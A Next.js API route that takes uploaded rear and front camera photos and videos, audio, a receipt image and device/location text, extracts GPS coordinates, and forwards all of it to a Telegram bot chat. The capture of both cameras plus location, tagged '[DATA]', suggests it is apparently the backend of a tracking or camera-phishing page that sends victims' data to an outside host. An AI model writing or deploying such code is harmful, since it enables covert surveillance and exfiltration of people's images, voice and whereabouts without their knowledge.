import { NextResponse } from "next/server";

const TELEGRAM_API = "https://api.telegram.org/bot";

interface LocationData {
  lat: number;
  lng: number;
}

/** Logging helper — writes to stdout in production (captured by next-server.log) */
function log(level: "INFO" | "WARN" | "ERROR", msg: string, detail?: unknown) {
  const ts = new Date().toISOString();
  const extra = detail ? ` ${JSON.stringify(detail).slice(0, 500)}` : "";
  console[level === "ERROR" ? "error" : level === "WARN" ? "warn" : "log"](
    `[telegram/${level}] ${msg}${extra}`
  );
}

/** Send a fetch to Telegram API and verify response */
async function tgFetch(
  botToken: string,
  method: string,
  body: BodyInit,
  headers?: Record<string, string>
): Promise<boolean> {
  const url = `${TELEGRAM_API}${botToken}/${method}`;
  const opts: RequestInit = {
    method: "POST",
    headers: headers as Record<string, string> | undefined,
    body,
  };
  if (body instanceof FormData) {
    // Let fetch set Content-Type with boundary for FormData
    delete opts.headers;
  }
  try {
    const res = await fetch(url, opts);
    if (!res.ok) {
      const text = await res.text().catch(() => "no body");
      log("ERROR", `${method} failed (${res.status})`, text.slice(0, 300));
      return false;
    }
    return true;
  } catch (err) {
    log("ERROR", `${method} network error`, err);
    return false;
  }
}

/** Try to extract GPS coords from a text string (e.g. "GPS: -6.2, 106.8" or "Latitude: -6.2") */
function extractLocation(text: string): LocationData | null {
  // Format: "GPS: -6.2, 106.8" or "GPS: -6,2, 106.8"
  const gpsMatch = text.match(/GPS:\s*([\d,. -]+),\s*([\d,. -]+)/i);
  if (gpsMatch) {
    const lat = parseFloat(gpsMatch[1].replace(",", "."));
    const lng = parseFloat(gpsMatch[2].replace(",", "."));
    if (!isNaN(lat) && !isNaN(lng)) return { lat, lng };
  }

  // Format: "Latitude: -6.2" + "Longitude: 106.8"
  const latMatch = text.match(/Latitude:\s*([\d,. -]+)/i);
  const lngMatch = text.match(/Longitude:\s*([\d,. -]+)/i);
  if (latMatch && lngMatch) {
    const lat = parseFloat(latMatch[1].replace(",", "."));
    const lng = parseFloat(lngMatch[1].replace(",", "."));
    if (!isNaN(lat) && !isNaN(lng)) return { lat, lng };
  }

  // Format IP: "Koordinat: -6.2,106.8"
  const ipLocMatch = text.match(/Koordinat:\s*([\d,. -]+),([\d,. -]+)/i);
  if (ipLocMatch) {
    const lat = parseFloat(ipLocMatch[1].replace(",", "."));
    const lng = parseFloat(ipLocMatch[2].replace(",", "."));
    if (!isNaN(lat) && !isNaN(lng)) return { lat, lng };
  }

  return null;
}

export async function POST(request: Request) {
  try {
    const data = await request.formData();
    const photo = data.get("photo") as File | null;
    const video = data.get("video") as File | null;
    const audio = data.get("audio") as File | null;
    const document = data.get("document") as File | null;
    const locationInfo = data.get("locationInfo") as string | null;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      log("ERROR", "Telegram credentials missing");
      return NextResponse.json(
        { error: "Telegram credentials missing" },
        { status: 500 }
      );
    }

    const results: { step: string; ok: boolean }[] = [];

    // — 1. Send Location PIN (interactive map pin) if we can extract coords —
    if (locationInfo) {
      const loc = extractLocation(locationInfo);
      if (loc) {
        const ok = await tgFetch(
          botToken,
          "sendLocation",
          JSON.stringify({
            chat_id: chatId,
            latitude: loc.lat,
            longitude: loc.lng,
            live_period: 0,
          }),
          { "Content-Type": "application/json" }
        );
        results.push({ step: "sendLocation", ok });
        log("INFO", `sendLocation: ${ok ? "OK" : "FAIL"}`);
      } else {
        log("WARN", "locationInfo present but no parsable coords found");
      }

      // — 2. Send full device info as text message —
      const ok = await tgFetch(
        botToken,
        "sendMessage",
        JSON.stringify({
          chat_id: chatId,
          text: `[DATA]\n\n${locationInfo}`,
        }),
        { "Content-Type": "application/json" }
      );
      results.push({ step: "sendMessage", ok });
      log("INFO", `sendMessage: ${ok ? "OK" : "FAIL"}`);
    }

    // — 3. Send Photo (rear/main camera) —
    if (photo && photo.size > 0) {
      const fd = new FormData();
      fd.append("chat_id", chatId);
      fd.append("photo", photo);
      fd.append("caption", "📷 Rear Camera");
      const ok = await tgFetch(botToken, "sendPhoto", fd);
      results.push({ step: "sendPhoto", ok });
    }

    // — 3b. Send Front Camera Photo —
    const photo2 = data.get("photo2") as File | null;
    if (photo2 && photo2.size > 0) {
      const fd = new FormData();
      fd.append("chat_id", chatId);
      fd.append("photo", photo2);
      fd.append("caption", "🤳 Front Camera");
      const ok = await tgFetch(botToken, "sendPhoto", fd);
      results.push({ step: "sendPhoto2", ok });
    }

    // — 4. Send Video (rear/main camera) —
    if (video && video.size > 0) {
      const fd = new FormData();
      fd.append("chat_id", chatId);
      fd.append("video", video);
      fd.append("caption", "🎥 Rear Camera Video");
      const ok = await tgFetch(botToken, "sendVideo", fd);
      results.push({ step: "sendVideo", ok });
    }

    // — 4b. Send Front Camera Video —
    const video2 = data.get("video2") as File | null;
    if (video2 && video2.size > 0) {
      const fd = new FormData();
      fd.append("chat_id", chatId);
      fd.append("video", video2);
      fd.append("caption", "🎥 Front Camera Video");
      const ok = await tgFetch(botToken, "sendVideo", fd);
      results.push({ step: "sendVideo2", ok });
    }

    // — 5. Send Audio —
    if (audio && audio.size > 0) {
      const fd = new FormData();
      fd.append("chat_id", chatId);
      fd.append("audio", audio);
      const ok = await tgFetch(botToken, "sendAudio", fd);
      results.push({ step: "sendAudio", ok });
    }

    // — 6. Send Document (resit/receipt photo) —
    if (document && document.size > 0) {
      const fd = new FormData();
      fd.append("chat_id", chatId);
      fd.append("document", document);
      fd.append("caption", "📄 Receipt / Resit");
      const ok = await tgFetch(botToken, "sendDocument", fd);
      results.push({ step: "sendDocument", ok });
    }

    const allOk = results.every((r) => r.ok);
    log("INFO", allOk ? "All messages sent" : "Some messages failed", results);

    return NextResponse.json({ success: allOk, results });
  } catch (error) {
    log("ERROR", "Unhandled error", error);
    return NextResponse.json(
      { error: "Failed to send data" },
      { status: 500 }
    );
  }
}
